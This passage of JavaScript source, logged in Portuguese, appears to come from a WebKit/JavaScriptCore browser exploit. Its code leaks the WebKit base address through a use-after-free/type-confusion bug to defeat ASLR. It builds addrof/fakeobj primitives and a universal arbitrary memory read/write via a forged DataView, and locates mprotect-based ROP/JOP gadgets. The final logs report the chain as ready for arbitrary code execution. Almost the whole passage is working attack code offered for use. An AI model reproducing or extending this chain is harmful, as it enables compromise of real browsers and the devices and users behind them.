                    const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
                    const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
                    logFn(`[UAF LEAK] Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
                    const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4);

                    if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
                        logFn(`[UAF LEAK] LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
                    } else {
                        logFn(`[UAF LEAK] ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando para endereços de código.`, "warn");
                    }

                } catch (e_uaf_leak) {
                    logFn(`[UAF LEAK] ERRO CRÍTICO no vazamento de ASLR via UAF/TC: ${e_uaf_leak.message}\n${e_uaf_leak.stack || ''}`, "critical");
                    throw new Error("Vazamento de ASLR via UAF/TC falhou, abortando exploração.");
                }
                await PAUSE(LOCAL_MEDIUM_PAUSE);

                logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");

                const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
                const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE, 0));
                logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");

                const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
                let universalRwSuccess = false;

                for (const candidate_m_mode of mModeCandidates) {
                    logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
                    universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
                        logFn,
                        PAUSE,
                        JSC_OFFSETS_PARAM,
                        DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE,
                        candidate_m_mode
                    );
                    if (universalRwSuccess) {
                        found_m_mode = candidate_m_mode;
                        logFn(`[${FNAME_CURRENT_TEST_BASE}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(found_m_mode)}.`, "good");
                        break;
                    } else {
                        logFn(`[${FNAME_CURRENT_TEST_BASE}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
                        await PAUSE(LOCAL_SHORT_PAUSE);
                    }
                }

                if (!universalRwSuccess) {
                    const errorMsg = "Falha crítica: NENHUM dos m_mode candidatos conseguiu configurar a primitiva Universal ARB R/W via fakeobj DataView. Abortando exploração.";
                    logFn(errorMsg, "critical");
                    throw new Error(errorMsg);
                }
                logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
                await PAUSE(LOCAL_MEDIUM_PAUSE);

                const dumpTargetUint8Array = new Uint8Array(0x100);
                hold_objects.push(dumpTargetUint8Array);
                const dumpTargetAddr = addrof_core(dumpTargetUint8Array);
                logFn(`[DEBUG] Dump de memória de um novo Uint8Array real (${dumpTargetAddr.toString(true)}) usando L/E Universal.`, "debug");
                await dumpMemory(dumpTargetAddr, 0x100, logFn, arb_read_universal_js_heap, "Uint8Array Real Dump (Post-Universal-RW)");
                await PAUSE(LOCAL_MEDIUM_PAUSE);

                logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
                const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
                const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);

                logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
                const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4);
                logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
                if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
                    logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
                } else {
                    logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
                }

                logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
                await PAUSE(LOCAL_MEDIUM_PAUSE);


                logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
                const rwTestPostLeakStartTime = performance.now();

                const test_obj_post_leak = global_spray_objects[50000];
                hold_objects.push(test_obj_post_leak);
                logFn(`Objeto de teste escolhido do spray (índice 50000) para teste pós-vazamento.`, "info");

                const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
                logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");

                const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak);
                if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
                    throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
                }

                const original_val_prop = test_obj_post_leak.val1;
                logFn(`Valor original de 'val1' no objeto de spray: ${toHex(original_val_prop)}`, 'debug');

                faked_obj_for_post_leak_test.val1 = 0x1337BEEF;
                await PAUSE(LOCAL_VERY_SHORT_PAUSE);
                const read_back_val_prop = faked_obj_for_post_leak_test.val1;

                if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
                    logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, "good");
                } else {
                    logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read via fakeobj: ${toHex(read_back_val_prop)}.`, "error");
                    throw new Error("R/W verification post-ASLR leak failed.");
                }

                logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");

                logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária múltiplas vezes...", "info");
                let resistanceSuccessCount_post_leak = 0;
                const numResistanceTests = 10;
                const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);

                for (let i = 0; i < numResistanceTests; i++) {
                    const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
                    try {
                        await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8);
                        const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8);

                        if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
                            resistanceSuccessCount_post_leak++;
                            logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                        } else {
                            logFn(`[Resistência PÓS-VAZAMENTO #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
                        }
                    } catch (resErr) {
                        logFn(`[Resistência PÓS-VAZAMENTO #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
                    }
                    await PAUSE(LOCAL_VERY_SHORT_PAUSE);
                }
                if (resistanceSuccessCount_post_leak === numResistanceTests) {
                    logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
                } else {
                    logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
                }
                logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");

                logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++", "vuln");
                attemptResult.success = true;
                attemptResult.message = "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.";
                attemptResult.details = {
                    webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                    mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
                    foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A",
                    jsObjectPtrTagHigh: toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)
                };

            } catch (e) {
                attemptResult.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
                attemptResult.success = false;
                logFn(attemptResult.message, "critical");
            } finally {
                logFn(`Iniciando limpeza final do ambiente e do spray de objetos para a próxima tentativa...`, "info");
                global_spray_objects = [];
                hold_objects = [];
                clearOOBEnvironment({ force_clear_even_if_not_setup: true });
                logFn(`Limpeza final concluída para a tentativa. Tempo total: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
            }
            final_results.push(attemptResult);
            logFn(`--- TENTATIVA CONCLUÍDA: Tamanho Vítima=${victim_size} bytes, Spray Count=${spray_count}. Resultado: ${attemptResult.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
        }
    }

    logFn(`\n--- ${FNAME_CURRENT_TEST_BASE} Concluído. Sumário de todas as tentativas: ---`, "test");
    let overallSuccessCount = 0;
    final_results.forEach((res, index) => {
        logFn(`[SUMÁRIO ${index + 1}] Vítima=${res.victim_size}, Spray=${res.spray_count}: ${res.success ? 'SUCESSO' : 'FALHA'} - ${res.message}`, res.success ? 'good' : 'error');
        if (res.details) {
            logFn(`  Detalhes: ${JSON.stringify(res.details)}`, "info");
        }
        if (res.success) overallSuccessCount++;
    });

    const overallResultSuccess = overallSuccessCount > 0; // Se pelo menos uma tentativa foi bem-sucedida
    const finalMessageOverall = overallResultSuccess
        ? `SUCESSO GERAL: Pelo menos uma combinação de parâmetros resultou em exploração bem-sucedida. Total de SUCESSOS: ${overallSuccessCount} de ${final_results.length} tentativas.`
        : `FALHA GERAL: Nenhuma combinação de parâmetros resultou em exploração bem-sucedida.`;

    logFn(`\n${finalMessageOverall}`, overallResultSuccess ? 'vuln' : 'critical');

    return {
        errorOccurred: overallResultSuccess ? null : finalMessageOverall,
        addrof_result: { success: overallResultSuccess, msg: "Primitiva addrof funcional (se houver sucesso geral)." },
        webkit_leak_result: { success: overallResultSuccess, msg: finalMessageOverall, all_attempts_details: final_results },
        heisenbug_on_M2_in_best_result: 'N/A (UAF Strategy)',
        oob_value_of_best_result: 'N/A (UAF Strategy)',
        tc_probe_details: { strategy: 'UAF/TC -> ARB R/W' }
    };
}
